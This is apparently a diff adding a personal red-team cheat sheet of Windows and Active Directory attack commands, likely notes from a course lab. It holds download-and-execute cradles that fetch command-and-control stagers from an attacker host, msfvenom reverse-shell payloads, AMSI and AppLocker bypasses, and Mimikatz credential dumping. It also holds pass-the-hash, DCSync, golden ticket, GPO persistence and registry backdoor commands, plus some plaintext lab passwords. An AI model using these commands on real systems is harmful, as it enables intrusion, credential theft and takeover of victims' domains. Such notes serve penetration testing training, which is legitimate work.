@@ -1,0 +1,680 @@
+SharpShell var defender = SCM.GetService("hostname", "WinDefend"); return defender.Status.ToString();
+use post/windows/manage/shellcode_inject  crea un .bin en covenant
+use exploit/windows/smb/psexec
+netsh advfirewall firewall add rule name="Totally Legit Rule" dir=in action=allow protocol=TCP localport=8080
+netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=x.x.x.x
+portfwd add -R -p 8080 -l 80 -L 10.8.0.6
+PowerShell $PID % Setabelt MappDrivers
+PowerShell Find-DomainShare -CheckAccess
+Seatbelt MappedDrives (c:\, d:\) averigurar el proceso  PowerShell $PID
+Seatbelt InternetSettings
+---------------------------
+PS > $grunt = (new-object net.webclient).downloaddata("http://10.8.0.6/http-grunt.exe")
+PS > [System.Reflection.Assembly]::Load($grunt)
+PS > [GruntStager.GruntStager]::Execute()
+---------------------------------
+iex (new-object net.webclient).downloadstring("http://x.x.x.x/bypass.ps1"); iex (new-object net.webclient).downloadstring("http://x.x.x.x/payload.ps1")
+$bytes = [System.IO.File]::ReadAllBytes("c:\tools\AmsiTest\bin\Debug\AmsiTest.dll")
+[System.Reflection.Assembly]::Load($bytes)
+rundll32.exe PowerShdll.dll,main "$ExecutionContext.SessionState.LanguageMode"
+rundll32 PowerShdll.dll,main . { iwr -useb https://website.com/Script.ps1 } ^| iex;
+rundll32 Powershdll.dll,main [System.Text.Encoding]::Default.GetString([System.Convert]::FromBase64String("BASE64")) ^| iex
+----
+rundll32.exe PowerShdll.dll,main
+msfvenom -p windows/meterpreter/reverse_tcp lhost=eth0 lport=8080 -f dll > test.dll 
+windows/manage/shellcode_inject
+windows/local/bypassuac_dotnet_profiler
+----
+ENCODE
+$str = "IEX ((new-object net.webclient).downloadstring('http://10.8.0.6:80/http-beacon'))"
+[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
+--------------------------------------------------------------------------------
+https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20shellcode.xml
+--------------------------------------------------------------------------------------
+rundll32 test.dll,main
+msfvenom -p windows/meterpreter/reverse_http lhost=eth0 lport=8080 -f dll > test.dll
+
+
+
+-------------------------------------------------------------------------------------------
+-----------------------------------------------------------------------------------------
+# APPLOCKER
+Find  GpcFileSysPath of the GPO
+KeyName     : Software\Policies\Microsoft\Windows\SrpV2\Script\9428c672-5fc3-47f4-808a-a0011f36dd2c
+KeyName     : Software\Policies\Microsoft\Windows\SrpV2\Exe\451f43f7-5300-4991-b9ca-73b0c17150de
+KeyName     : Software\Policies\Microsoft\Windows\SrpV2\Exe\f9ec2ad9-2412-431e-adc8-e5280802cb17
+
+# Host Reconnaissance
+ImpersonatProcess
+Seatbelt -group=system
+Seatbelt MappedDrives (c:\, d:\) averigurar el proceso  PowerShell $PID
+Seatbelt InternetSettings
+PortScan fs-1,dc-1 135,445,3389,4444,5985 
+
+#Persistence
+HKCU / HKLM Registry Autoruns
+Scheduled Tasks
+Startup Folder
+COM Hijacking
+Hunting COM Hijacks
+WMI Subscriptions
+
+#LocalPrivilegeEscalation
+PowerUp
+SharpUp
+Watson
+WindowsService
+---------------------
+Weak Service Permissions
+SharUp
+PowerShell 'CYBER AI Service' | Get-ServiceAcl | Select-Object -ExpandProperty Access
+Upload /filepath:"C:\Windows\Temp\GruntSMB_svc.exe"
+Shell sc config "CYBER AI Service" binPath= "C:\Windows\Temp\GruntSMB_svc.exe"
+Shell sc qc "CYBER AI Service"
+Shell sc stop "CYBER AI Service"
+Shell sc start "CYBER AI Service"
+
+ShellCmd /shellcommand:"sc config \"CYBER AI Service\" binPath=\"c:\\Temp\80.exe\""
+ShellCmd /shellcommand:"sc stop \"CYBER AI Service\" "
+ShellCmd /shellcommand:"sc qc \"CYBER AI Service\" "
+ShellCmd /shellcommand:"sc start \"CYBER AI Service\" "
+------------------------------------------------------------------
+Unquoted Service Paths
+C:\Program Files\CYBER\CYBER FW\FwSvc.exe
+
+Always Install Elevated
+
+UAC Bypasses                                                                                                  wusa.exe
+SharpShell /code:"var startInfo = new System.Diagnostics.ProcessStartInfo { FileName = @\"C:\Windows\System32\Taskmgr.exe\", WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden }; var taskmgr = new System.Diagnostics.Process { StartInfo = startInfo }; taskmgr.Start(); return taskmgr.Id.ToString();"
+(rasta) > BypassUACCommand cmd.exe "/c powershell -enc [...snip...]" o BypassUACGrunt /launcher:"powershell"
+BypassUACGrunt powershell ""crear antes un ps1 y dejarlo tal cual""
+
+crear un servicebinary sin moverlo
+psexec localhost servicebinary
+connect localhost pipen  or si httpgruntproxy no hace falta
+
+--Grunt Service Binary --
+--Connect localhost rastasvc--
+--pesexec or wmiexec --powershell
+
+Shellcmd wmic /node:"hostname" /user:"domain.io\n.lamb" /password:"pass" process call create “powershell -Sta -Nop -Window Hidden -EncodedCommand “”
+wmigrunt wkstn-4945 powershell 
+
+SharpWMI /command:"action=exec computername=hostname command=\"C:\Temp\rasta3.exe"
+
+connect hostname pipensvc
+
+PowerShellRemotingCommand hostname "powershell.exe -Sta -Nop -Window Hidden -EncodedCommand '' "
+PowerShellRemotingCommand hostname "C:\users\n.lamb\AppData\Local\Temp\GruntSMB.exe" cyberbotic.io user password
+
+WMICommand hostname path user password
+connect hostname pipensvc
+
+psexec hostname servicebinary
+connect hostname 
+
+---------------------------------------------------------------------------------------
+#DOMAIN RECONNAISSANCE
+
+Get-Domain
+PowerShell Get-Domain
+PowerShell Get-DomainController | Select-Object Forest, Name, OSVersion
+PowerShell Get-ForestDomain
+PowerShell Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess                      Get-DomainPolicy
+PowerShell Get-DomainUser -Identity j.hunt -Properties DisplayName, MemberOf | Format-List    Get-DomainUser
+PowerShell Get-DomainComputer -Properties DnsHostName | Sort-Object -Property DnsHostName     Get-DomainComputer
+PowerShell Get-DomainOU -Properties Name | Sort-Object -Property Name                         Get-DomainOU
+PowerShell Get-DomainGroup -Identity 'Domain Admins' | Select-Object -ExpandProperty Member   Get-DomainGroup
+PowerShell Get-DomainGroupMember -Identity 'Domain Admins' | Select-Object MemberDistinguishedName Get-DomainGroupMember
+PowerShell Get-DomainGPO -Properties DisplayName | Sort-Object -Property DisplayName          Get-DomainGPO
+PowerShell Get-DomainGPO -ComputerIdentity wkstn-1555 -Properties DisplayName | Sort-Object -Property DisplayName  
+PowerShell Get-DomainGPOLocalGroup | Select-Object GPODisplayName, GroupName                  Get-DomainGPOLocalGroup
+PowerShell Find-DomainUserLocation | Select-Object UserName, SessionFromName                  Find-DomainUserLocation
+PowerShell Get-NetLocalGroup | Select-Object GroupName                                        Get-NetLocalGroup
+PowerShell Get-NetLocalGroupMember -GroupName Administrators | Select-Object MemberName, IsGroup, IsDomain   Get-NetLocalGroupMember
+PowerShell Get-NetLoggedOn                                                                    Get-NetLoggedOn
+PowerShell Get-NetSession -ComputerName fs-1 | Select-Object CName, UserName                  Get-NetSession
+PowerShell Get-DomainTrust                                                                    Get-DomainTrust
+
+-----------------
+BloodHound
+-----------------
+ Assembly /assemblyname:"SharpHound3" /parameters:"-c All GPOLocalGroup"
+ proxychains bloodhound-python  -u user  -p  pass -d domain -ns 10.95.108.1 -gc namemachine  --dns-tcp   done
+ 
+ 
+---------------------------------------------------------------------------
+ #Credentials & User Impersonation
+ 
+ LogonPasswords 
+ Mimikatz sekurlsa::logonpasswords
+ hashcat -a 3 -m 1000 nlamb.ntlm
+ SafetyKatz
+
+ Security Account Manager
+ Mimikatz token::elevate lsadump::sam
+
+ Token Impersonation
+ ImpersonateProcess and ImpersonateUser 
+ RevToSelf
+ 
+ Domain Cached Credentials
+ Mimikatz token::elevate lsadump::cache
+ 
+ MakeToken
+ MakeToken n.lamb cyberbotic.io REDACTED
+ 
+ Overpass-the-Hash TGT
+ Rubeus triage
+ Rubeus asktgt /user:n.lamb /rc4:REDACTED          or add /ptt
+ copy the ticket clean space on line
+ MakeToken n.lamb cyberbotic.io DoesNotMatter
+ Rubeus triage
+ Rubeus ptt /ticket:doIFXDCCBVi[...snip...]bDWN5YmVyYm90aWMuaW8=
+ \\wkstn-4945\c$\$Recycle.Bin 
+ 
+ PowerShellRemotingCommnad maquina "whoami, hostname"
+ 
+ Process Injection
+ 
+ ---------------------------------------------------------------------------------
+ #Password Cracking
+ 
+ NTLM
+ hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt D:\Tools\rockyou.txt
+ john --wordlist= D:\Tools\rockyou.txt 
+ 
+ Lateral Movement
+ Windows Management Instrumentation (WMI)
+ wmic /node:"wkstn-4945" /user:"cyberbotic.io\n.lamb" /password:"REDACTED" WMICommand wkstn-4945 powershell -Sta -Nop -Window Hidden -EncodedCommand SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAY [...snip...]"
+ SharpWMI /command:"action=exec computername=wkstn-4945 command=\"C:\Windows\Temp\GruntHTTP.exe\""
+ PowerShell Remoting
+ PowerShellRemotingCommand wkstn-4945 "powershell -enc [...snip...]"
+ PowerShellRemotingCommand wkstn-4945 "whoami; hostname" cyberbotic.io n.lamb REDACTED
+ PsExec
+ upload windows tasks
+ psexec wkstn-4945 servicebinary
+ connect wkstn-4945 rastasvc
+ 
+ DCOM
+ HKEY_CLASSES_ROOT\CLSID
+ DCOMGrunt wkstn-4945 powershell 
+ Hunting DCOM Opportunities
+ Get-ChildItem -Path Registry::HKCR\CLSID -Name | select -First 5
+ Get-ChildItem -Path Registry::HKCR\CLSID -Name | select -Skip 1 | Out-File CLSIDs.txt
+ 
+ Session IDs
+ ProcessList / ps
+ 1 best
+ 
+-----------------------------------------------------------------------------------------
+Maintain Presence
+SharpShell
+SharpShell var defender = SCM.GetService("wkstn-4945", "WinDefend"); return defender.Status.ToString(); DEFENDER
+
+#Session Passing
+
+set payload windows/x64/meterpreter/reverse_http
+msfvenom -p windows/x64/meterpreter/reverse_http LHOST=tun0 LPORT=8080 EXITFUNC=thread -f raw -o /tmp/msf.bin
+
+set payload windows/meterpreter/reverse_http
+msfvenom -p windows/meterpreter/reverse_http LHOST=tun0 LPORT=8080 EXITFUNC=thread -f raw -o /tmp/msf.bin
+
+find 1 process x64 or x86
+ps
+or
+sharpshell var target = System.Diagnostics.Process.Start("notepad"); return target.Id.ToString();
+
+#SOCKS Proxies
+use auxiliary/server/socks4a
+run -j
+route add 10.0.0.0/8 1
+route add 10.10.0.0/16 1
+proxychains nmap -n -sT -Pn -p445 10.10.120.1
+
+Impacket
+proxychains python3 /usr/share/doc/python3-impacket/examples/wmiexec.py -hashes REDACTED:REDACTED user@10.10.120.1
+proxychains evil-winrm -u n.glover -H REDACTED -i 10.10.120.1
+
+Windows
+sudo proxychains socat TCP4-Listen:445,fork TCP:10.10.120.1:445
+mimikatz # privilege::debug
+mimikatz # sekurlsa::pth /user:n.glover /domain:cyberbotic.io /ntlm:REDACTED
+C:\Windows\system32>dir \\kali\c$
+
+PowerShell Remoting
+sudo proxychains socat TCP4-Listen:5985,fork TCP:10.10.120.1:5985
+mimikatz # sekurlsa::pth /user:n.glover /domain:cyberbotic.io /ntlm:REDACTED /run:powershell
+Enter-PSSession -ComputerName kali
+
+#Tunnelling Metasploit
+setg Proxies socks4:127.0.0.1:1080
+use exploit/windows/smb/psexec
+
+#Reverse Port Forwards
+netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=x.x.x.x
+netsh advfirewall firewall add rule name="Totally Legit Rule" dir=in action=allow protocol=TCP localport=8080
+meterpreter > portfwd add -R -p 8080 -l 80 -L 10.8.0.6
+
+#Reverse Port Forward HTTP Pivots
+portfwd add -R -p 9999 -l 443 -L 10.8.0.6
+remeber bind meterpreter
+route add 10.10.120.0/23 2
+codif (windows/smb/psexec) > set CMD powershell -Sta -Nop -Window Hidden -Command "iex (New-Object Net.WebClient).DownloadString('http://10.10.121.119:9999/http-grunt-pivot.ps1
+
+#Data Protection API
+Credential Manager
+ShellCmd vaultcmd /listcreds:"Windows Credentials" /all
+sekurlsa::dpapi 
+dpapi::masterkey
+
+Google Chrome
+Assembly /assemblyname:"SharpChromium" /parameters:"history logins"
+
+#Kerberos
+PowerShell Get-DomainUser -SPN -Properties SamAccountName, ServicePrincipalName
+Rubeus kerberoast
+hascat -m 13100
+
+PowerShell Get-DomainUser -PreauthNotRequired -Properties SamAccountName
+Rubeus asreproast /format:hashcat
+hascat 18200
+
+Unconstrained Delegation
+PowerShell Get-DomainComputer -Unconstrained -Properties DnsHostName
+Rubeus triage
+Rubeus dump   pillar el usuario de dominio  0x2fb8d49  | w.schneider @ CYBERBOTIC.IO   | krbtgt/CYBERBOTIC.IO 
+Rubeus dump /luid:0x2fb8d49  
+Rubeus dump /service:krbtgt  -todos?
+Rubeus createnetonly /program:C:\Windows\System32\cmd.exe
+Rubeus ptt /luid:0x21d8e17 /ticket:[...snip...] luid del proceso
+ImpersonateProcess 2768 n proceso
+PowerShellRemotingGrunt dc-1 PowerShell
+
+The "Printer Bug"
+https://blog.ettic.ca/northsec-2019-windows-track-writeup-69d5bcf06abd
+Assembly /assemblyname:"Rubeus" /parameters:"dump /service:krbtgt"
+MakeToken Administrator CYBER DoesNotMatter
+DCSync CYBER\krbtgt
+https://github.com/blackc03r/OSCP-Cheatsheets/blob/master/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation.md
+
+Constrained Delegation
+PowerShell Get-DomainComputer -TrustedToAuth -Properties DnsHostName, MSDS-AllowedToDelegateTo
+Rubeus dump /service:krbtgt
+Rubeus s4u /impersonateuser:n.glover /msdsspn:cifs/fs-1.cyberbotic.io /ticket:[...snip...]
+Rubeus createnetonly /program:C:\Windows\System32\cmd.exe
+
+Credential Cache
+Linux
+MakeToken a.mitchell cyberbotic.io DoesNotMatter
+[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Users\User\Desktop\amitchell.kirbi"))
+Rubeus ptt /ticket:doIF[...snip...]Tw==
+
+#Group Policy Abuse
+Create GPOs
+Modify existing GPOs
+Link GPOs to OUs
+
+PowerShell Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN, SecurityIdentifier | fl
+PowerShell Get-DomainComputer | ? { $_.DistinguishedName -match "OU=3268" -or $_.DistinguishedName -match "OU=5735" } | select DnsHostName
+
+GroupPolicy RSAT
+PowerShell $env:ComputerName
+PowerShell Get-Module -List -Name GroupPolicy | Select-Object -ExpandProperty ExportedCommands
+PowerShell New-GPO -Name 'Totally Legit GPO' | New-GPLink -Target 'OU=3268,OU=Workstations,DC=cyberbotic,DC=io'
+PowerShell Set-GPPrefRegistryValue -Name 'Totally Legit GPO' -Context Computer -Action Create -Key 'HKLM\Software\Microsoft\Windows\CurrentVersion\Run' -ValueName 'Updater' -Value 'powershell -w 1 -c "iex (new-object net.webclient).downloadstring(''http://10.8.0.6/HTTPGrunt.ps1'')"' -Type ExpandString
+
+SharpGPOAbuse
+PowerShell New-GPO -Name 'Another Totally Legit GPO' | New-GPLink -Target 'OU=5735,OU=Workstations,DC=cyberbotic,DC=io'
+Assembly /assemblyname:"SharpGPOAbuse" /parameters:"--AddComputerTask --TaskName \"Legit Task\" --Author NT AUTHORITY\SYSTEM --Command \"cmd.exe\" --Arguments \"/c powershell -nop -w hidden -enc [...snip...]\" --GPOName \"Another Totally Legit GPO\""
+PowerShell Find-DomainShare -CheckShareAccess
+Upload /filepath:"Grunt.exe"
+cmd.exe /c \\fs-1\software\Grunt.exe
+Assembly /assemblyname:"SharpGPOAbuse" /parameters:"--AddComputerTask --TaskName \"Rasta Task\" --Author NT AUTHORITY\SYSTEM --Command \"cmd.exe\" --Arguments \"/c \\fs-1\software\Grunt.exe\" --GPOName \"Rasta GPO\""
+
+#MSSQLServers
+MakeToken svc_mssql cyberbotic.io REDACTED
+PowerShell Get-SQLInstanceDomain | Get-SQLConnectionTest
+PowerShell Get-SQLServerInfo -Instance 'sql-1.cyberbotic.io,1433'
+PowerShell Get-SQLQuery -Instance 'sql-1.cyberbotic.io,1433' -Query 'select @@servername'
+PowerShell Invoke-SQLOSCmd -Instance 'sql-1.cyberbotic.io,1433' -Command 'dir C:\' -RawResults
+proxychains socat TCP4-Listen:1433,fork TCP:10.10.120.20:1433
+runas /netonly /user:CYBER\svc_mssql "C:\Program Files\HeidiSQL\heidisql.exe"
+
+sp_configure 'Show Advanced Options', 1; RECONFIGURE;
+sp_configure 'xp_cmdshell', 1; RECONFIGURE
+
+MS SQL Lateral Movement
+PowerShell Get-SQLServerLinkCrawl -Instance 'sql-1.cyberbotic.io,1433'
+PowerShell Get-SQLServerLinkCrawl -Instance 'sql-1.cyberbotic.io,1433' -Query 'select @@version' | select Instance, CustomQuery
+PowerShell Get-SQLServerLinkCrawl -Instance 'sql-1.cyberbotic.io,1433' -Query 'select @@version' | select Instance, CustomQuery | % { $_ | Add-Member NoteProperty 'QueryResult' $($_.CustomQuery[0]); $_ } | fl
+EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT [sql02.dev.zeropointsecurity.co.uk]
+EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [sql02.dev.zeropointsecurity.co.uk]
+SELECT * FROM OPENQUERY("sql02.dev.zeropointsecurity.co.uk", 'select * from sys.configurations where name = ''xp_cmdshell''')
+
+MS SQL Privilege Escalation
+powershell_import /tmp/PowerUp.ps1
+powershell_execute Invoke-PrivescAudit
+execute -H -c -i -f JuicyPotato.exe -a "-t * -p C:\Temp\msf.exe -l 1337"
+
+#Domain Dominance Add-DomainObjectAcl 
+DCSync krbtgt
+lsadump::dcsync /user:krbtgt /domain:cyberbotic.io
+PowerShell Add-DomainObjectAcl -TargetIdentity 'DC=cyberbotic,DC=io' -PrincipalIdentity 'r.meyer' -Rights DCSync
+DCSync krbtgt
+lsadump::dcsync /user:krbtgt /domain:cyberbotic.io
+
+#Remote Registry Backdoor
+PowerShell Add-RemoteRegBackdoor -ComputerName dc-1 -Trustee CYBER\s.ball
+PowerShell Get-RemoteMachineAccountHash -ComputerName dc-1
+
+#Golden Tickets
+ls \\dc-1\c$
+kerberos::golden /user:<> /domain:<> /sid:<> /krbtgt:<> /ticket:golden.kirbi
+.user is the username to impersonate
+.domain is the FQDN of the current domain
+.sid is the SID of the current domain
+.krbtgt is the NTLM hash of the krbtgt account
+.ticket is the filename to save as
+mimikatz # kerberos::golden /user:Administrator /domain:cyberbotic.io /sid:S-1-5-21-3865823697-1816233505-1834004910 /krbtgt:REDACTED /ticket:golden.kirbi
+[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Users\IEUser\Desktop\golden.kirbi")) 
+Rubeus ptt /ticket:[...snip...]
+
+# Silver Tickets
+Rubeus ptt /ticket:[...snip...]
+kerberos::golden /user:<> /domain:<> /sid:<> /target:<> /service:<> /rc4:<> /ticket:silver.kirbi
+kerberos::golden /user:Administrator /domain:cyberbotic.io /sid:S-1-5-21-3865823697-1816233505-1834004910 /target:dc-1.cyberbotic.io /service:cifs /rc4:REDACTED /ticket:silver.kirbi
+
+#Domain Trusts
+One-Way Domain Trust
+Bidirectional Domain Trust
+PowerShell Get-DomainComputer -Domain dev.zeropointsecurity.co.uk | select DnsHostName
+Assembly SharpHound3 "-c All -D dev.zeropointsecurity.co.uk"
+Assembly SharpView "Get-DomainUser -SPN -Domain dev.zeropointsecurity.co.uk -Properties SamAccountName"
+
+#GPO
+Bloodhound 
+PowerShell Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN, SecurityIdentifier | fl
+PowerShell Find-DomainShare -CheckShareAccess
+PowerShell New-GPO -Name 'comemeloshuevos2' | New-GPLink -Target 'OU=3268,OU=Workstations,DC=cyberbotic,DC=io'  
+Assembly  /assemblyname:"SharpGPOAbuse" /parameters:"--AddComputerTask --TaskName \"Rasta Task\" --Author NT AUTHORITY\SYSTEM --Command \"cmd.exe\" --Arguments \"/c \\fs-1\software\nuevo2.exe\" --GPOName \"comemeloshuevos2\""
+
+#MS SQL Servers
+MakeToken svc_mssql cyberbotic.io REDACTED
+PowerShell Get-SQLInstanceDomain | Get-SQLConnectionTest
+PowerShell Get-SQLServerInfo -Instance 'sql-1.cyberbotic.io,1433'
+PowerShell Get-SQLQuery -Instance 'sql-1.cyberbotic.io,1433' -Query 'select @@servername'
+PowerShell Invoke-SQLOSCmd -Instance 'sql-1.cyberbotic.io,1433' -Command 'dir C:\' -RawResults
+
+proxychains socat TCP4-Listen:1433,fork TCP:10.10.120.20:1433
+
+open cmd as administrator serkulsa..etc
+mimikatz sekurlsa::pth /user:s.ball /domain:cyberbotic.io /ntlm:ewewefewff /run  "c:\program.exe"
+runas /netonly /user:CYBER\svc_mssql "C:\Program Files\HeidiSQL\heidisql.exe"
+
+sp_configure 'Show Advanced Options', 1; RECONFIGURE;
+sp_configure 'xp_cmdshell', 1; RECONFIGURE
+EXEC xp_cmdshell 'whoami'
+
+portfwd add -R -p 8080 -l ip -L 443
+portfwd add -R -p 8888 -l 80 -L ip
+
+#MS SQL Lateral Movement
+
+PowerShell Get-SQLServerLinkCrawl -Instance 'sql-1.cyberbotic.io,1433'
+PowerShell Get-SQLServerLinkCrawl -Instance 'sql-1.cyberbotic.io,1433' -Query 'select @@version' | select Instance, CustomQuery
+PowerShell Get-SQLServerLinkCrawl -Instance 'sql-1.cyberbotic.io,1433' -Query 'select @@version' | select Instance, CustomQuery | % { $_ | Add-Member NoteProperty 'QueryResult' $($_.CustomQuery[0]); $_ } | fl
+EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT [sql02.dev.zeropointsecurity.co.uk]
+EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [sql02.dev.zeropointsecurity.co.uk]
+SELECT * FROM OPENQUERY("sql02.dev.zeropointsecurity.co.uk", 'select * from sys.configurations where name = ''xp_cmdshell''')
+
+portfwd flush
+netstat -anp tcp
+portfwd add -R -p 8888 -l 80
+
+#MS SQL Privilege Escalation
+powershell_import /tmp/PowerUp.ps1
+powershell_execute Invoke-PrivescAudit
+execute -H -c -i -f JuicyPotato.exe -a "-t * -p C:\Temp\msf.exe -l 1337"
+
+#Domain Dominance
+PowerShell Add-DomainObjectAcl -TargetIdentity 'DC=cyberbotic,DC=io' -PrincipalIdentity 'r.meyer' -Rights DCSync
+krbtgt NTLM
+mimikatz(powershell) # lsadump::dcsync /user:krbtgt /domain:cyberbotic.io
+
+#Remote Registry Backdoor
+PowerShell Get-RemoteMachineAccountHash -ComputerName dc-1
+PowerShell Add-RemoteRegBackdoor -ComputerName dc-1 -Trustee CYBER\s.ball
+RemoteHashRetrieval.ps1
+PowerShell Get-RemoteMachineAccountHash -ComputerName dc-1
+
+#Golden Tickets
+kerberos::golden /user:<> /domain:<> /sid:<> /krbtgt:<> /ticket:golden.kirbi
+mimikatz # kerberos::golden /user:Administrator /domain:cyberbotic.io /sid:S-1-5-21-3865823697-1816233505-1834004910 /krbtgt:REDACTED /ticket:golden.kirbi
+[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Users\IEUser\Desktop\golden.kirbi")) 
+Rubeus ptt /ticket:[...snip...]
+Upload \\dc-1\c$\Windows\Temp\GruntService.exe
+Assembly CsExec "dc-1 GruntService GruntService C:\Windows\Temp\GruntService.exe"
+connect dc-1 rastasvc
+
+#Silver Tickets
+kerberos::golden /user:<> /domain:<> /sid:<> /target:<> /service:<> /rc4:<> /ticket:silver.kirbi
+kerberos::golden /user:Administrator /domain:cyberbotic.io /sid:S-1-5-21-3865823697-1816233505-1834004910 /target:dc-1.cyberbotic.io /service:cifs /rc4:REDACTED /ticket:silver.kirbi
+
+#Domain Trusts
+OneWay
+PowerShell Get-DomainTrust -Domain dev.zeropointsecurity.co.uk
+PowerShell Get-DomainComputer -Domain dev.zeropointsecurity.co.uk | select DnsHostName
+Assembly SharpHound3 "-c All -D dev.zeropointsecurity.co.uk"
+Assembly SharpView "Get-DomainUser -SPN -Domain dev.zeropointsecurity.co.uk -Properties SamAccountName"
+Rubeus kerberoast /domain:dev.zeropointsecurity.co.uk
+Bidirectional
+PowerShell Get-DomainGroup -Identity 'Domain Admins' -Domain zeropointsecurity.co.uk | select ObjectSid
+mimikatz # kerberos::golden /user:Administrator /domain:dev.zeropointsecurity.co.uk /sid:S-1-5-21-2824171953-2587308990-2984250211 /sids:S-1-5-21-3063796876-3415205720-618848691-512 /krbtgt:REDACTED /ticket:zps.kirbi
+
+
+
+python3 bloodhound.py -u user -p pass -d domain -gc FQDN_DC -c All -ns ip
+proxychains bloodhound-python -c all -u n.glover  -p BenNev\!s  -d cyberbotic.io -ns 10.10.120.1  --dns-tcp     
+proxychains bloodhound-python -c all -u bridgesb  -p Scorpion!  -d dev.zeropointsecurity.co.uk -ns 10.95.108.1 -gc AD02  --dns-tcp   
+proxychains bloodhound-python  -u bridgesb  -p  Scorpion\! -d dev.zeropointsecurity.co.uk -ns 10.95.108.1 -gc ad02.dev.zeropointsecurity.co.uk  --dns-tcp   done
+
+PowerShell Get-DomainTrust -Domain dev.zeropointsecurity.co.uk
+PowerShell Get-DomainComputer -Domain dev.zeropointsecurity.co.uk | select DnsHostName
+Assembly SharpHound3 "-c All -D dev.zeropointsecurity.co.uk"
+Assembly SharpView "Get-DomainUser -SPN -Domain dev.zeropointsecurity.co.uk -Properties SamAccountName"
+
+#Bidirectional Domain Trust
+PowerShell Get-DomainGroup -Identity 'Domain Admins' -Domain zeropointsecurity.co.uk | select ObjectSid
+mimikatz # kerberos::golden /user:<> /domain:<> /sid:<> /sids:<> /krbtgt:<>
+mimikatz # kerberos::golden /user:Administrator /domain:dev.zeropointsecurity.co.uk /sid:S-1-5-21-2824171953-2587308990-2984250211 /sids:S-1-5-21-3063796876-3415205720-618848691-512 /krbtgt:REDACTED /ticket:zps.kirbi
+
+#Azure AD Connect
+ADConnectDump
+
+#Local Administrator Password Solutin
+
+ls \\cyberbotic.io\SysVol\cyberbotic.io\Policies\{FDC369C2-35C2-4D97-B455-BB7839854512}\Machine
+crackmapexec smb 10.10.10.10 -u user -H 8846f7eaee8fb117ad06bdd830b7586c -M laps
+ldapsearch -x -h  -D "@" -w  -b "dc=<>,dc=<>,dc=<>" "(&(objectCategory=computer)(ms-MCS-AdmPwd=*))" ms-MCS-AdmPwd`
+python laps.py -u user -p e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c -d domain.local -l dc01.domain.local
+
+PowerShell Get-DomainComputer -Identity wkstn-1921 -Properties ms-Mcs-AdmPwd
+ms-mcs-admpwd 
+MVYZKwfr356v3M
+MakeToken Administrator . MVYZKwfr356v3M
+
+#Windows Defender Antivirus & AMSI
+ThreatCheck.exe -f C:\Users\Rasta\Downloads\GruntHTTP.exe -e Defender
+
+#Reflection
+PS > $dll = [System.IO.File]::ReadAllBytes("C:\Users\IEUser\source\repos\ReflectionDemo\bin\Release\ReflectionDemo.dll")
+PS > $dllstring = [System.Convert]::ToBase64String($dll)
+PS > [System.Reflection.Assembly]::Load([System.Convert]::FromBase64String($dllstring))
+PS > [ReflectionDemo.DemoClass]::PrintStuff()
+Hello World
+
+whiout disk
+$grunt = (new-object net.webclient).downloaddata("http://10.8.0.6/http-grunt.exe")
+[System.Reflection.Assembly]::Load($grunt)
+
+#Antimalware Scan Interface (AMSI)
+
+iex (new-object net.webclient).downloadstring("http://x.x.x.x/bypass.ps1"); iex (new-object net.webclient).downloadstring("http://x.x.x.x/payload.ps1")
+$bytes = [System.IO.File]::ReadAllBytes("c:\tools\AmsiTest\bin\Debug\AmsiTest.dll")
+[System.Reflection.Assembly]::Load($bytes)
+class Program
+{
+  static void Main(string[] args)
+  {
+    var client = new WebClient();
+    var gruntStager = client.DownloadData("http://10.8.0.6/GruntHTTPStager.exe");
+    client.Dispose();
+
+    // bypass code here
+
+    var asm = Assembly.Load(gruntStager);
+    var type = asm.GetType("GruntStager.GruntStager");
+    var instance = Activator.CreateInstance(type);
+    type.InvokeMember("GruntStager", BindingFlags.InvokeMethod | BindingFlags.Public | BindingFlags.Static, null, instance, null);
+  }
+}
+
+#ThreatCheck (In-Memory)
+ThreatCheck.exe -f C:\Users\Rasta\source\repos\GruntStager\bin\Debug\GruntStager.exe
+ThreatCheck.exe -f C:\Users\Rasta\Downloads\GruntExecutor.bin -e AMSI
+
+#AppLocker
+Software\Policies\Microsoft\Windows\SrpV2\Script\9428c672-5fc3-47f4-808a-a0011f36dd2c
+rundll32.exe
+------------------------------------------------------------------
+-------------------------------------------------------------------
+BLOODHOUND-TIPS
+https://medium.com/@riccardo.ancarani94/bloodhound-tips-and-tricks-e1853c4b81ad
+Mark user as owned
+MATCH (n:User)WHERE n.hasspn=true RETURN n
+MATCH (dc:Computer)-[:MemberOf*1..]->(g:Group) WHERE g.objectsid ENDS WITH "516" WITH COLLECT(dc) as domainControllers MATCH p = (d:Domain)-[:Contains*1..]->(c:Computer {unconstraineddelegation:true}) WHERE NOT c in domainControllers RETURN c
+MATCH (dc:Computer)-[:MemberOf*1..]->(g:Group) WHERE g.objectsid ENDS WITH "516" WITH COLLECT(dc) as domainControllers MATCH p = (d:Domain)-[:Contains*1..]->(c:Computer {unconstraineddelegation:true}) WHERE NOT c in domainControllers SET c.highvalue = true RETURN c
+DOMAIN ADMINS@
+Info
+Reachable
+MATCH p=shortestPath((c {owned: true})-[*1..3]->(s)) WHERE NOT c = s RETURN p
